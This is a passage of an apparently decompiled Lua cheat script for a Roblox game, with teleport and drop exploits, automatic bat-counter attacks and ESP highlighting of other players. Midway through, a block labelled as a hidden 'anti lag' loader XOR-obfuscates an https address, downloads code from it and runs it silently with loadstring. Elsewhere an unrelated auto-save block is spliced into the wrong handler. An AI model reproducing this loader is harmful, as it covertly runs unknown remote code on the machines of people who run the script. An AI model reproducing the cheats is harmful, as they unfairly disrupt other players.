    fn50 = function(arg, arg2)
      local KYRONSetMobileActionLive = _G._KYRONSetMobileActionLive

      if type(KYRONSetMobileActionLive) == "function" then
        pcall(KYRONSetMobileActionLive, arg, arg2 and true or false)
      end
    end

    dropMode = "JUMP"

    do
      local n34 = 0.18

      if _G._KYRONDropConn then
        pcall(function()
          _G._KYRONDropConn:Disconnect()
        end)

        _G._KYRONDropConn = nil
      end

      _G._KYRONDropInProgress = false

      fn51 = function()
        if _G._KYRONSafeModeEnabled == true and type(_G._KYRONSafeModeHoldingBrainrot) == "function" then
          local ok, holding = pcall(_G._KYRONSafeModeHoldingBrainrot)
          if ok and holding == true then
            if _G._KYRONSafeModeNotify then
              _G._KYRONSafeModeNotify("SAFE MODE: DROP BLOCKED WHILE HOLDING")
            end
            return
          end
        end
        if dropControllerState.active then
          return
        end
        local character = localPlayer.Character
        if not character then
          return
        end
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        local v78 = character:FindFirstChildOfClass("Humanoid")
        if not humanoidRootPart or not v78 then
          return
        end
        local KYRONDropRayParams = _G._KYRONDropRayParams

        if not KYRONDropRayParams then
          KYRONDropRayParams = RaycastParams.new()
          KYRONDropRayParams.FilterType = Enum.RaycastFilterType.Exclude
          KYRONDropRayParams.RespectCanCollide = true
          _G._KYRONDropRayParams = KYRONDropRayParams
        end

        KYRONDropRayParams.FilterDescendantsInstances = { character }
        local hit = workspace:Raycast(humanoidRootPart.Position + Vector3.new(0, 0.35, 0), Vector3.new(0, -2000, 0), KYRONDropRayParams)
        if not hit then
          return
        end
        _G._KYRONDropToken = (_G._KYRONDropToken or 0) + 1
        local KYRONDropToken = _G._KYRONDropToken
        local rotation = humanoidRootPart.CFrame.Rotation
        local x = humanoidRootPart.Position.X
        local z = humanoidRootPart.Position.Z
        dropControllerState.active = true
        _G._KYRONDropInProgress = true

        if _G._KYRONPauseAutoTPForAction then
          pcall(_G._KYRONPauseAutoTPForAction)
        end

        fn50("Drop Brainrot", true)

        if _G._KYRONDropConn then
          pcall(function()
            _G._KYRONDropConn:Disconnect()
          end)
        end

        local now2 = tick()

        _G._KYRONDropConn = RunService.Heartbeat:Connect(function()
          local character2 = localPlayer.Character
          local v79 = character2 and character2:FindFirstChild("HumanoidRootPart")
          local humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")

          if KYRONDropToken ~= _G._KYRONDropToken or not v79 or not humanoid or humanoid.Health <= 0 or not dropControllerState.active then
            if _G._KYRONDropConn then
              _G._KYRONDropConn:Disconnect()
              _G._KYRONDropConn = nil
            end

            dropControllerState.active = false
            _G._KYRONDropInProgress = false
            fn50("Drop Brainrot", false)
            return
          end

          if n34 <= tick() - now2 then
            if _G._KYRONDropConn then
              _G._KYRONDropConn:Disconnect()
              _G._KYRONDropConn = nil
            end

            pcall(function()
              KYRONDropRayParams.FilterDescendantsInstances = { character2 }
              local hit2 = workspace:Raycast(v79.Position + Vector3.new(0, 0.35, 0), Vector3.new(0, -2000, 0), KYRONDropRayParams) or hit

              if hit2 then
                v79.CFrame = CFrame.new(x, hit2.Position.Y + humanoid.HipHeight + v79.Size.Y * 0.5 + 0.2, z) * rotation
                v79.AssemblyLinearVelocity = Vector3.zero
                v79.AssemblyAngularVelocity = Vector3.zero
              end
            end)

            dropControllerState.active = false
            _G._KYRONDropInProgress = false
            fn50("Drop Brainrot", false)
            return
          end

          v79.AssemblyLinearVelocity = Vector3.new(0, 155, 0)
        end)
      end
    end
  end

  local fn52, fn53
  -- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"]nF\\R"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)
  do
    do
      localPlayer.CharacterRemoving:Connect(function()
        dropControllerState.active = false
        _G._KYRONDropInProgress = false

        if _G._KYRONDropConn then
          pcall(function()
            _G._KYRONDropConn:Disconnect()
          end)

          _G._KYRONDropConn = nil
        end

        fn50("Drop Brainrot", false)
      end)

      tpMode = "full"

      _G._VezyBatSlapList = {
        "Bat",
        "Slap",
        "Iron Slap",
        "Gold Slap",
        "Diamond Slap",
        "Emerald Slap",
        "Ruby Slap",
        "Dark Matter Slap",
        "Flame Slap",
        "Nuclear Slap",
        "Galaxy Slap",
        "Glitched Slap",
      }

      _G._VezyGetBat = function()
        local character = localPlayer.Character
        if not character then
          return nil
        end

        for _, v78 in ipairs(_G._VezyBatSlapList) do
          local v79 = character:FindFirstChild(v78)
          if v79 and v79:IsA("Tool") then
            return v79
          end
        end

        local backpack = localPlayer:FindFirstChildOfClass("Backpack")

        if backpack then
          for _, v78 in ipairs(_G._VezyBatSlapList) do
            local v79 = backpack:FindFirstChild(v78)

            if v79 and v79:IsA("Tool") then
              local v80 = character:FindFirstChildOfClass("Humanoid")

              if v80 then
                pcall(function()
                  v80:EquipTool(v79)
                end)
              end

              return v79
            end
          end
        end

        for _, child in ipairs(character:GetChildren()) do
          local isTool = child:IsA("Tool")
          local pos

          if isTool then
            pos = child.Name:lower():find("bat") or child.Name:lower():find("slap")
          else
            pos = isTool
          end

          if pos then
            return child
          end
        end

        if backpack then
          for _, child in ipairs(backpack:GetChildren()) do
            if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
              local humanoid = character:FindFirstChildOfClass("Humanoid")

              if humanoid then
                pcall(function()
                  humanoid:EquipTool(child)
                end)
              end

              return child
            end
          end
        end

        return nil
      end

      _G._VezyBatCounterOn = false
      _G._VezyBatCounterDebounce = false
      _G._VezyBatCounterConn = nil

      _G.VezyStartBatCounter = function()
        if _G._VezyBatCounterConn then
          return
        end

        _G._VezyBatCounterConn = RunService.Heartbeat:Connect(function()
          if not _G._VezyBatCounterOn then
            return
          end

          if _G._VezyBatCounterDebounce then
            return
          end
          local character = localPlayer.Character
          if not character then
            return
          end
          local humanoid = character:FindFirstChildOfClass("Humanoid")
          if not humanoid then
            return
          end
          local state = humanoid:GetState()

          if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
            _G._VezyBatCounterDebounce = true

            task.spawn(function()
              local v78 = _G._VezyGetBat()

              if v78 then
                local humanoid2 = character:FindFirstChildOfClass("Humanoid")

                if v78.Parent ~= character and humanoid2 then
                  pcall(function()
                    humanoid2:EquipTool(v78)
                  end)

                  task.wait(0.05)
                end

                local remoteEvent = v78:FindFirstChildOfClass("RemoteEvent") or v78:FindFirstChildOfClass("RemoteFunction")

                if remoteEvent and remoteEvent:IsA("RemoteEvent") then
                  pcall(function()
                    remoteEvent:FireServer()
                  end)

                  task.wait(0.15)

                  pcall(function()
                    remoteEvent:FireServer()
                  end)
                else
                  pcall(function()
                    v78:Activate()
                  end)

                  task.wait(0.15)

                  pcall(function()
                    v78:Activate()
                  end)
                end
              end

              task.wait(0.5)
              _G._VezyBatCounterDebounce = false
            end)
          end
        end)
      end

      _G.VezyStopBatCounter = function()
        if _G._VezyBatCounterConn then
          _G._VezyBatCounterConn:Disconnect()
          _G._VezyBatCounterConn = nil
        end

        _G._VezyBatCounterDebounce = false
      end

      do
        local function fn54()
          local v78 = nil
          local connection2 = nil

          local function fn55()
            if connection2 then
              return
            end
            local character = localPlayer.Character
            if not character then
              return
            end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not humanoid then
              return
            end

            connection2 = humanoid.StateChanged:Connect(function(old, new)
              if not (new == Enum.HumanoidStateType.Physics or new == Enum.HumanoidStateType.Ragdoll or new == Enum.HumanoidStateType.FallingDown) then
                return
              end

              if _G._VezyBatCounterDebounce then
                return
              end

              task.spawn(function()
                local character2 = localPlayer.Character
                if not character2 then
                  return
                end
                local humanoidRootPart = character2:FindFirstChild("HumanoidRootPart")
                if not humanoidRootPart then
                  return
                end
                local huge = math.huge
                local v79 = nil

                for _, player in ipairs(Players:GetPlayers()) do
                  if player ~= localPlayer and player.Character then
                    local humanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")

                    if humanoidRootPart2 then
                      local magnitude = (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude

                      if magnitude < 25 and magnitude < huge then
                        huge = magnitude
                        v79 = humanoidRootPart2
                      end
                    end
                  end
                end

                if v79 then
                  local n34 = v79.Position - humanoidRootPart.Position
                  local vector = Vector3.new(n34.X, 0, n34.Z)

                  if vector.Magnitude > 0.1 then
                    local v80 = math.deg(math.atan2(-vector.X, -vector.Z))
                    local cframe = CFrame.Angles
                    local v81 = 0
                    humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.CFrame.Position) * cframe(v81, math.rad(v80), 0)
                  end

                  v78 = v79
                end
              end)
            end)
          end

          localPlayer.CharacterAdded:Connect(function()
            task.wait(0.5)

            if _G._VezyBatCounterOn then
              -- Reliable periodic Auto Save. Changes are still saved immediately by
      -- the existing handlers; this loop also catches changes made by runtime
      -- state/controls that do not pass through a UI FocusLost/Activated event.
      task.spawn(function()
        while task.wait(5) do
          if _G._KYRONSettingsReady == true and _G._KYRONConfigLoadReady == true then
            if autoSaveSettings.auto and type(saveKYRONSettings) == "function" then
              pcall(saveKYRONSettings)
            end
          end
        end
      end)

      pcall(function()
        game:BindToClose(function()
          if type(saveKYRONSettings) == "function" then
            pcall(saveKYRONSettings, true)
            task.wait(0.15)
          end
        end)
      end)

      fn55()
            end
          end)
        end

        fn54()
      end
    end

    do
      local v78 = _G
      local KYRONOshaBatCounter = _G._KYRONOshaBatCounter
      local KYRONOshaBatCounter2

      if KYRONOshaBatCounter then
        KYRONOshaBatCounter2 = KYRONOshaBatCounter
      else
        KYRONOshaBatCounter2 = {
          on = false,
          mode = _G._KYRONBatCounterMode or "V1",
          connection = nil,
          debounce = false,
          hitCooldown = false,
          lastV2 = 0,
        }
      end

      v78._KYRONOshaBatCounter = KYRONOshaBatCounter2
    end

    _G._KYRONOshaBatCounter.isRagdolled = function(arg, arg2)
      arg = arg and arg:FindFirstChildOfClass("Humanoid")
      if not arg then
        return false
      end
      local state = arg:GetState()
      return state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown or arg2 == true and state == Enum.HumanoidStateType.GettingUp
    end

    _G._KYRONOshaBatCounter.getBat = function(arg)
      local backpack = localPlayer:FindFirstChildOfClass("Backpack")

      for _, v78 in ipairs({ arg, backpack }) do
        if v78 then
          for _, child in ipairs(v78:GetChildren()) do
            if child:IsA("Tool") then
              local str10 = child.Name:lower()
              if str10:find("bat") or str10:find("slap") or str10:find("sword") or str10:find("knife") then
                return child
              end
            end
          end
        end
      end

      return nil
    end

    _G._KYRONOshaBatCounter.hit = function(arg)
      local KYRONOshaBatCounter = _G._KYRONOshaBatCounter
      if KYRONOshaBatCounter.hitCooldown then
        return
      end
      KYRONOshaBatCounter.hitCooldown = true

      pcall(function()
        local v78 = KYRONOshaBatCounter.getBat(arg)
        local v79 = arg and arg:FindFirstChildOfClass("Humanoid")
        if not v78 or not v79 then
          return
        end

        if v78.Parent ~= arg then
          v79:EquipTool(v78)
        end

        v78:Activate()
        local remoteEvent = v78:FindFirstChildWhichIsA("RemoteEvent")

        if remoteEvent then
          remoteEvent:FireServer()
        end
      end)

      task.delay(0.08, function()
        KYRONOshaBatCounter.hitCooldown = false
      end)
    end

    _G._KYRONOshaBatCounter.closestAnimalCarrier = function()
      do
        local character = localPlayer.Character
        local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then
          return nil
        end
        local n34 = 12
        local v78 = nil

        for _, player in ipairs(Players:GetPlayers()) do
          local character2 = player ~= localPlayer and player.Character
          local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
          local humanoid = character2 and character2:FindFirstChildOfClass("Humanoid")

          if humanoidRootPart2 and humanoid and humanoid.Health > 0 then
            local flag28 = false

            for _, child in ipairs(character2:GetChildren()) do
              local isTool = child:IsA("Tool")
              local handle

              if isTool then
                handle = child:FindFirstChild("Handle") or child.Name:find("Animal") or child.Name:find("Pet")
              else
                handle = isTool
              end

              if handle then
                flag28 = true
                break
              end
            end

            local magnitude = (humanoidRootPart2.Position - humanoidRootPart.Position).Magnitude

            if flag28 and magnitude < n34 then
              n34 = magnitude
              v78 = player
            end
          end
        end

        return v78
      end
    end

    _G._KYRONOshaBatCounter.runV2 = function(arg)
      local KYRONOshaBatCounter = _G._KYRONOshaBatCounter
      local debounce = KYRONOshaBatCounter.debounce

      if not debounce then
        local lastV2 = KYRONOshaBatCounter.lastV2
        debounce = tick() - lastV2 < 0.01
      end

      if debounce then
        return
      end
      local v78 = KYRONOshaBatCounter.closestAnimalCarrier()
      if not v78 or KYRONOshaBatCounter.isRagdolled(v78.Character, false) then
        return
      end
      local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
      local humanoidRootPart2 = v78.Character and v78.Character:FindFirstChild("HumanoidRootPart")
      if not humanoidRootPart or not humanoidRootPart2 then
        return
      end
      local now2 = tick()
      KYRONOshaBatCounter.debounce = true
      KYRONOshaBatCounter.lastV2 = now2

      pcall(function()
        if _G._KYRONVoltHiddenPropertyDisabled then
          _G._KYRONVoltHiddenPropertyDisabled(humanoidRootPart, "PhysicsRepRootPart", humanoidRootPart2)
        end

        local n34 = humanoidRootPart2.Position + Vector3.new(0, 0.9, 0)

        if 24 < (humanoidRootPart.Position - n34).Magnitude then
          humanoidRootPart.CFrame = CFrame.new(n34)
        end

        KYRONOshaBatCounter.hit(arg)

        task.delay(0.05, function()
          KYRONOshaBatCounter.hit(arg)
        end)

        task.delay(0.4, function()
          KYRONOshaBatCounter.hit(arg)
        end)
      end)

      task.delay(0.2, function()
        if not combatSettings.desync and humanoidRootPart.Parent and _G._KYRONVoltHiddenPropertyDisabled then
          pcall(_G._KYRONVoltHiddenPropertyDisabled, humanoidRootPart, "PhysicsRepRootPart", nil)
        end

        KYRONOshaBatCounter.debounce = false
      end)
    end

    _G._KYRONOshaBatCounter.start = function()
      local KYRONOshaBatCounter = _G._KYRONOshaBatCounter
      if KYRONOshaBatCounter.connection then
        return
      end

      KYRONOshaBatCounter.connection = RunService.Heartbeat:Connect(function()
        if not KYRONOshaBatCounter.on or KYRONOshaBatCounter.debounce then
          return
        end
        local character = localPlayer.Character
        local v78 = character and character:FindFirstChildOfClass("Humanoid")
        if not character or not v78 or v78.Health <= 0 then
          return
        end

        if KYRONOshaBatCounter.mode == "V2" then
          if KYRONOshaBatCounter.isRagdolled(character, true) then
            KYRONOshaBatCounter.runV2(character)
          end

          return
        end

        if KYRONOshaBatCounter.isRagdolled(character, false) then
          KYRONOshaBatCounter.debounce = true

          task.spawn(function()
            task.wait(0.15)
            KYRONOshaBatCounter.hit(character)
            task.wait(0.3)
            KYRONOshaBatCounter.debounce = false
          end)
        end
      end)
    end

    _G._KYRONOshaBatCounter.stop = function()
      local KYRONOshaBatCounter = _G._KYRONOshaBatCounter

      if KYRONOshaBatCounter.connection then
        KYRONOshaBatCounter.connection:Disconnect()
        KYRONOshaBatCounter.connection = nil
      end

      KYRONOshaBatCounter.debounce = false
      KYRONOshaBatCounter.hitCooldown = false
    end

    fn52 = function()
      local KYRONOshaBatCounter = _G._KYRONOshaBatCounter
      KYRONOshaBatCounter.on = true
      _G._VezyBatCounterOn = true
      KYRONOshaBatCounter.start()
    end

    fn53 = function()
      local KYRONOshaBatCounter = _G._KYRONOshaBatCounter
      KYRONOshaBatCounter.on = false
      _G._VezyBatCounterOn = false
      KYRONOshaBatCounter.stop()
    end

    if _G._KYRONTpCounterBatV2 and _G._KYRONTpCounterBatV2.setEnabled then
      pcall(_G._KYRONTpCounterBatV2.setEnabled, false)
    end

    _G._KYRONTpCounterBatV2 = nil
    _G._KYRONTpCounterBatV2On = false
    _G._KYRONTpCounterBatV2Active = false
    flag25 = false
    _G._KYRONMedusaState = { cooldown = 25, lastUsed = 0, debounce = false, anchorConns = {} }

    do
      local function fn54()
        local function fn55()
          local character = localPlayer.Character
          if not character then
            return nil
          end

          for _, child in ipairs(character:GetChildren()) do
            if child:IsA("Tool") then
              local str10 = child.Name:lower()
              if str10:find("medusa") or str10:find("head") or str10:find("stone") then
                return child
              end
            end
          end

          local backpack = localPlayer:FindFirstChild("Backpack")

          if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
              if child:IsA("Tool") then
                local str10 = child.Name:lower()
                if str10:find("medusa") or str10:find("head") or str10:find("stone") then
                  return child
                end
              end
            end
          end

          return nil
        end

        local function fn56()
          local KYRONMedusaState = _G._KYRONMedusaState
          if KYRONMedusaState.debounce then
            return
          end
          local lastUsed = KYRONMedusaState.lastUsed
          if tick() - lastUsed < KYRONMedusaState.cooldown then
            return
          end
          local character = localPlayer.Character
          if not character then
            return
          end
          KYRONMedusaState.debounce = true
          local v78 = fn55()
          if not v78 then
            KYRONMedusaState.debounce = false
            return
          end

          if v78.Parent ~= character then
            local humanoid = character:FindFirstChildOfClass("Humanoid")

            if humanoid then
              humanoid:EquipTool(v78)
            end
          end

          pcall(function()
            v78:Activate()
          end)

          KYRONMedusaState.lastUsed = tick()
          KYRONMedusaState.debounce = false
        end

        _G._KYRONStopMedusaCounter = function()
          local KYRONMedusaState = _G._KYRONMedusaState

          for _, anchorConn in pairs(KYRONMedusaState.anchorConns) do
            pcall(function()
              anchorConn:Disconnect()
            end)
          end

          KYRONMedusaState.anchorConns = {}
        end

        _G._KYRONSetupMedusaCounter = function(arg)
          _G._KYRONStopMedusaCounter()
          local KYRONMedusaState = _G._KYRONMedusaState
          if not arg then
            return
          end

          local function fn57(arg2)
            return arg2:GetPropertyChangedSignal("Anchored"):Connect(function()
              if flag25 and arg2.Anchored and arg2.Transparency == 1 then
                fn56()
              end
            end)
          end

          for _, descendant in ipairs(arg:GetDescendants()) do
            if descendant:IsA("BasePart") then
              table.insert(KYRONMedusaState.anchorConns, fn57(descendant))
            end
          end

          table.insert(
            KYRONMedusaState.anchorConns,
            arg.DescendantAdded:Connect(function(descendant)
              if descendant:IsA("BasePart") then
                table.insert(KYRONMedusaState.anchorConns, fn57(descendant))
              end
            end)
          )
        end
      end

      fn54()
    end
  end

  local fn54

  do
    do
      _G._KYRONStartMedusaCounter = function()
        flag25 = true

        if localPlayer.Character then
          _G._KYRONSetupMedusaCounter(localPlayer.Character)
        end
      end

      _G._KYRONStopMedusaCounterUI = function()
        flag25 = false
        _G._KYRONStopMedusaCounter()
      end

      localPlayer.CharacterAdded:Connect(function(character)
        task.wait(0.3)

        if flag25 then
          _G._KYRONSetupMedusaCounter(character)
        end
      end)

      do
        local function fn55(arg)
          local character = localPlayer.Character
          if not character then
            return
          end
          local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
          local humanoid = character:FindFirstChildOfClass("Humanoid")
          if not humanoidRootPart or not humanoid then
            return
          end

          if not arg then
            local ok = false

            if type(_G._KYRONSafeModeHoldingBrainrot) == "function" then
              local result
              ok, result = pcall(_G._KYRONSafeModeHoldingBrainrot)
              ok = ok and result == true
            end

            if not ok then
              return
            end

            if humanoid.FloorMaterial ~= Enum.Material.Air then
              return
            end

            if not (humanoidRootPart.Position.Y >= autoTeleportState.height) then
              return
            end
          end

          local cframe = CFrame.Angles
          local cFrame = humanoidRootPart.CFrame
          humanoidRootPart.CFrame = CFrame.new(humanoidRootPart.Position.X, -7, humanoidRootPart.Position.Z) * cframe(0, select(2, cFrame:ToEulerAnglesYXZ()), 0)
          humanoidRootPart.Velocity = Vector3.zero
        end

        fn54 = function()
          fn50("TP Down", true)

          pcall(function()
            fn55(true)
          end)

          task.delay(0.22, function()
            fn50("TP Down", false)
          end)
        end

        autoTeleportState = { enabled = false, height = 10, pauseToken = 0 }

        _G._KYRONStopAutoTP = function()
          autoTeleportState.enabled = false
          autoTeleportState.pauseToken = (autoTeleportState.pauseToken or 0) + 1

          if _G._KYRONAutoTPThread then
            pcall(task.cancel, _G._KYRONAutoTPThread)
          end

          _G._KYRONAutoTPThread = nil
        end

        _G._KYRONStartAutoTP = function()
          if _G._KYRONAutoTPThread then
            pcall(task.cancel, _G._KYRONAutoTPThread)
          end

          _G._KYRONAutoTPThread = nil
          if not autoTeleportState.enabled then
            return
          end

          _G._KYRONAutoTPThread = task.spawn(function()
            while autoTeleportState.enabled do
              task.wait(0.4)

              pcall(function()
                fn55(false)
              end)
            end

            _G._KYRONAutoTPThread = nil
          end)
        end
      end
    end

    _G._KYRONPauseAutoTPForAction = function()
      if not autoTeleportState.enabled then
        return
      end
      autoTeleportState.pauseToken = (autoTeleportState.pauseToken or 0) + 1
      local pauseToken = autoTeleportState.pauseToken

      if _G._KYRONAutoTPThread then
        pcall(task.cancel, _G._KYRONAutoTPThread)
      end

      _G._KYRONAutoTPThread = nil

      task.spawn(function()
        task.wait(0.12)

        while autoTeleportState.enabled and pauseToken == autoTeleportState.pauseToken and _G._KYRONDropInProgress do
          task.wait(0.1)
        end

        if autoTeleportState.enabled and pauseToken == autoTeleportState.pauseToken and not _G._KYRONAutoTPThread then
          _G._KYRONStartAutoTP()
        end
      end)
    end

    _G._KYRONStopAutoTP()

    do
      local function fn55()
        local Players2 = game:GetService("Players")
        local RunService2 = game:GetService("RunService")
        local Workspace = game:GetService("Workspace")
        local localPlayer2 = Players2.LocalPlayer
        local color2 = Color3.fromRGB(255, 240, 255)
        _G._KYRONESPEnabled = false
        _G._KYRONESPShowHeader = false
        _G._KYRONESPShowTracer = false
        local tbl37 = {}
        local obj = setmetatable({}, { __mode = "k" })
        local obj2 = setmetatable({}, { __mode = "k" })
        local folder = nil

        local function fn56(arg)
          local v78 = obj2[arg]

          if v78 then
            pcall(function()
              v78:Destroy()
            end)
          end

          obj2[arg] = nil
        end

        local function fn57(arg, arg2)
          fn56(arg)
          local character = arg and arg.Character
          if not character or not arg2 then
            return
          end

          local ok, adornee = pcall(function()
            character.Archivable = true
            return character:Clone()
          end)

          if not ok or not adornee then
            return
          end

          for _, descendant in ipairs(adornee:GetDescendants()) do
            if descendant:IsA("Script") or descendant:IsA("LocalScript") or descendant:IsA("Humanoid") or descendant:IsA("Highlight") then
              descendant:Destroy()
            elseif descendant:IsA("BasePart") then
              descendant.Anchored = true
              descendant.CanCollide = false
              descendant.CanQuery = false
              descendant.CanTouch = false
            end
          end

          if not folder or not folder.Parent then
            folder = Instance.new("Folder")
            folder.Name = "KYRONESPVoidGhosts"
            folder.Parent = Workspace
          end

          adornee.Name = "KYRONVoidGhost_" .. arg.Name
          adornee.Parent = folder

          pcall(function()
            adornee:PivotTo(arg2)
          end)

          local highlight = Instance.new("Highlight")
          highlight.Name = "KYRONESP_VoidGhost"
          highlight.FillColor = Color3.fromRGB(0, 240, 0)
          highlight.OutlineColor = Color3.fromRGB(0, 240, 0)
          highlight.FillTransparency = 0
          highlight.OutlineTransparency = 0
          highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
          highlight.Adornee = adornee
          highlight.Parent = adornee
          obj2[arg] = adornee
        end

        _G._KYRONESPSetVoidGhost = function(arg, arg2)
          if not arg or not arg2 then
            return
          end
          obj[arg] = arg2
          local v78 = tbl37[arg]

          if v78 and v78.hl then
            v78.hl.Enabled = false
          end

          if not obj2[arg] or not obj2[arg].Parent then
            fn57(arg, arg2)
          end
        end

        _G._KYRONESPClearVoidGhost = function(arg)
          obj[arg] = nil
          fn56(arg)
          local v78 = tbl37[arg]

          if v78 and v78.hl and v78.hl.Parent then
            v78.hl.Enabled = true
          end
        end

        local screenGui = Instance.new("ScreenGui")
        screenGui.Name = "KYRONESP_Visual"
        screenGui.ResetOnSpawn = false
        screenGui.IgnoreGuiInset = true
        screenGui.DisplayOrder = 9999

        pcall(function()
          screenGui.Parent = gethui and gethui() or game:GetService("CoreGui")
        end)

        if not screenGui.Parent then
          screenGui.Parent = localPlayer2:WaitForChild("PlayerGui")
        end

        for _, child in ipairs(screenGui.Parent:GetChildren()) do
          if child ~= screenGui and child.Name == "KYRONESP_Visual" then
            pcall(function()
              child:Destroy()
            end)
          end
        end

        local function createHighlight(arg, adornee)
          if not adornee then
            return
          end
          local KYRONESPHl = adornee:FindFirstChild("KYRONESP_HL")

          if KYRONESPHl then
            KYRONESPHl:Destroy()
          end

          local highlight = Instance.new("Highlight")
          highlight.Name = "KYRONESP_HL"
          highlight.FillColor = color2
          highlight.OutlineColor = color2
          highlight.FillTransparency = 0.4
          highlight.OutlineTransparency = 1
          highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
          highlight.Adornee = adornee
          highlight.Parent = adornee
          return highlight
        end

        local function fn58(arg)
          local frame2 = Instance.new("Frame", screenGui)
          frame2.Name = "ESP_BOX_" .. arg.Name
          frame2.BackgroundTransparency = 1
          frame2.BorderSizePixel = 0
          frame2.Visible = false
          frame2.ZIndex = 9999
          local frame3 = Instance.new("Frame", screenGui)
          frame3.Name = "ESP_TRACER_" .. arg.Name
          frame3.AnchorPoint = Vector2.new(0.5, 0.5)
          frame3.BackgroundColor3 = color2
          frame3.BackgroundTransparency = 0.5
          frame3.BorderSizePixel = 0
          frame3.Visible = false
          frame3.ZIndex = 9998
          local frame4 = Instance.new("Frame", frame2)
          frame4.Name = "Header"
          frame4.AnchorPoint = Vector2.new(0.5, 1)
          frame4.Position = UDim2.new(0.5, 0, 0, -6)
          frame4.Size = UDim2.new(0, 200, 0, 26)
          frame4.BackgroundTransparency = 1
          frame4.ZIndex = 10000
          local textLabel = Instance.new("TextLabel", frame4)
          textLabel.Size = UDim2.new(1, 0, 1, 0)
          textLabel.BackgroundTransparency = 1
          textLabel.Text = "Speed: 0"
          textLabel.TextColor3 = color2
          textLabel.FontFace = font
          textLabel.TextSize = 7
          textLabel.TextStrokeTransparency = 0
          textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
          textLabel.ZIndex = 10001
          return frame2, textLabel, frame3, frame4, nil
        end

        local function fn59(arg)
          if arg == localPlayer2 then
            return
          end

          if tbl37[arg] then
            return
          end
          local v78, v79, v80, v81, v82 = fn58(arg)
          local tbl38 = { box = v78, boxSt = v82, speedLbl = v79, tracer = v80, header = v81, hl = nil }
          tbl37[arg] = tbl38

          if arg.Character then
            tbl38.hl = createHighlight(arg, arg.Character)
          end

          tbl38.charConn = arg.CharacterAdded:Connect(function(character)
            task.wait(0.4)
            tbl38.hl = createHighlight(arg, character)
          end)
        end

        local function fn60(player)
          local v78 = tbl37[player]
          if not v78 then
            return
          end

          if v78.charConn then
            pcall(function()
              v78.charConn:Disconnect()
            end)
          end

          if v78.box then
            pcall(function()
              v78.box:Destroy()
            end)
          end

          if v78.tracer then
            pcall(function()
              v78.tracer:Destroy()
            end)
          end

          if v78.hl then
            pcall(function()
              v78.hl:Destroy()
            end)
          end

          _G._KYRONESPClearVoidGhost(player)
          tbl37[player] = nil
        end

        Players2.PlayerAdded:Connect(function(player)
          if _G._KYRONESPEnabled then
            fn59(player)
          end
        end)

        Players2.PlayerRemoving:Connect(fn60)

        task.spawn(function()
          while task.wait(2) do
            if _G._KYRONESPEnabled then
              for _, player in ipairs(Players2:GetPlayers()) do
                if player ~= localPlayer2 then
                  if not tbl37[player] then
                    pcall(fn59, player)
                  else
                    local v78 = tbl37[player]
                    local character = player.Character

                    if character and (not v78.hl or v78.hl.Parent ~= character) then
                      pcall(function()
                        if v78.hl then
                          v78.hl:Destroy()
                        end
                      end)

                      v78.hl = createHighlight(player, character)
                    end
                  end
                end
              end
            end
          end
        end)

        RunService2.RenderStepped:Connect(function()
          if not _G._KYRONESPEnabled then
            for _, v78 in pairs(tbl37) do
              v78.box.Visible = false
              v78.tracer.Visible = false
            end

            return
          end

          local currentCamera = Workspace.CurrentCamera
          if not currentCamera then
            return
          end
          local viewportSize = currentCamera.ViewportSize
          local character = localPlayer2.Character
          local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
          local n34 = nil
          local n35 = nil

          if humanoidRootPart then
            local v78 = currentCamera:WorldToViewportPoint(humanoidRootPart.Position + Vector3.new(0, -0.5, 0))
            local v79 = nil
            n35 = nil

            if not (0 < v78.Z) then
              n34 = v79
            else
              local n36 = math.clamp(v78.X, 10, viewportSize.X - 10)
              n35 = math.clamp(v78.Y, 10, viewportSize.Y - 10)
              n34 = n36
            end
          end

          if not n34 then
            n34 = viewportSize.X / 2
            n35 = viewportSize.Y * 0.85
          end

          for k, v78 in pairs(tbl37) do
            local character2 = k.Character
            local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
            character2 = character2 and character2:FindFirstChildOfClass("Humanoid")
            local v79 = obj[k]

            if not humanoidRootPart2 or not character2 or character2.Health <= 0 then
              v78.box.Visible = false
              v78.tracer.Visible = false
            else
              if v78.hl then
                v78.hl.Enabled = v79 == nil
              end

              local position = v79 and v79.Position or humanoidRootPart2.Position
              local n36 = position + Vector3.new(0, 3.2, 0)
              local n37 = position + Vector3.new(0, -3, 0)
              local v80 = currentCamera:WorldToViewportPoint(n36)
              local v81 = currentCamera:WorldToViewportPoint(n37)

              if 0 < v80.Z then
                local n38 = math.abs(v81.Y - v80.Y)
                local n39 = n38 * 0.55
                local n40 = (v80.X + v81.X) / 2
